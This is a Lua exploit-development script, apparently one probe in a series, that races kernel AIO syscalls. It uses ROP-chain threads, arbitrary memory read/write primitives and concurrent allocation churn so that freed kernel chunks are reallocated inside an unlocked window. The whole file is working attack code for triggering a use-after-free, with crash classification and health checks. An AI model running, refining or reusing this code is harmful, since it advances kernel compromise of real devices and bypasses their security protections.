-- CRASH_CLASS: HIGH
-- PROBE 683a: same effect oracle, but the parent allocates and frees aio
-- objects throughout the race window instead of only afterwards, so a freed
-- 0x58/0x30/0x28 chunk can be re-handed to a new object while the racing
-- callers are still inside the unlocked tail.
print("=== PROBE 683a: AIO RACE WITH CONCURRENT CHURN ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local sc669,sc664,sc662,sc454=mk(669),mk(664),mk(662),mk(454)
local NB=8
local data=memory.alloc(0x1000)
for i=0,0xFFC,4 do wd(N(data)+i,0) end
local out=memory.alloc(0x40)
local function mkblock()
  wd(N(out),0)
  local o,r=pcall(function() return sc669(U(0x1001),U(N(data)),U(2),U(1),U(N(out)),U(0)) end)
  if o and N(r)==0 then return rd(N(out)) or 0 end
  return 0
end
local W=memory.alloc(8)
local bad=0
for r=1,8 do
  wd(N(W),0)
  local ids=memory.alloc(NB*2*4)
  local made=0
  for b=0,NB-1 do
    local base=mkblock()
    if base==0 then break end
    wd(N(ids)+b*8, base); wd(N(ids)+b*8+4, base+0x10000)
    made=made+1
  end
  local NI=made*2
  local chk=memory.alloc(0x40)
  local good=0
  for i=0,NI-1 do
    wd(N(chk),0x77777777)
    pcall(function() sc664(U(N(ids)+i*4),U(1),U(N(chk)),U(0),U(0),U(0)) end)
    local s=rd(N(chk)); if s==3 or s==0x10003 then good=good+1 end
  end
  local sts={}
  for k=1,4 do sts[k]=memory.alloc(NI*4); for i=0,NI*4-1,4 do wd(N(sts[k])+i,0) end end
  local chains={}
  for k=1,4 do
    local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
    c:push_syscall_with_ret(sc454,U(N(W)),U(2),U(0))
    for i=0,NI-1 do c:push_syscall(sc662,U(N(ids)+i*4),U(1),U(N(sts[k])+i*4)) end
    chains[k]=c
  end
  local th={}
  for k=1,4 do th[k]=thread:new(chains[k]); th[k]:run(true) end
  for i=1,60000 do local x=i end
  wd(N(W),1)
  pcall(function() sc454(U(N(W)),U(3),U(0x7fffffff),U(0),U(0),U(0)) end)
  -- churn inside the window
  local made2,del2=0,0
  for n=1,400 do
    local base=mkblock()
    if base~=0 then
      made2=made2+1
      local p=memory.alloc(8)
      wd(N(p),base)
      pcall(function() sc664(U(N(p)),U(1),U(0),U(0),U(0),U(0)) end)
      local s2=memory.alloc(8); wd(N(s2),0x55)
      pcall(function() sc662(U(N(p)),U(1),U(N(s2)),U(0),U(0),U(0)) end)
      if rd(N(s2))==0 then del2=del2+1 end
    end
  end
  for k=1,4 do pcall(function() th[k]:join() end) end
  local ok=0
  for n=1,4 do
    local base=mkblock()
    if base~=0 then
      local p=memory.alloc(8); wd(N(p),base)
      pcall(function() sc664(U(N(p)),U(1),U(0),U(0),U(0),U(0)) end)
      local s2=memory.alloc(8); wd(N(s2),0x55)
      pcall(function() sc664(U(N(p)),U(1),U(N(s2)),U(0),U(0),U(0)) end)
      pcall(function() sc662(U(N(p)),U(1),U(N(s2)),U(0),U(0),U(0)) end)
      if rd(N(s2))==0 then ok=ok+1 end
    end
  end
  print(string.format("[R%d] polled=%d churn made=%d del=%d health=%d",r,good,made2,del2,ok))
  if ok<4 then bad=bad+1 end
end
print(string.format("[X] bad rounds=%d",bad))
print(string.format("[Z] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
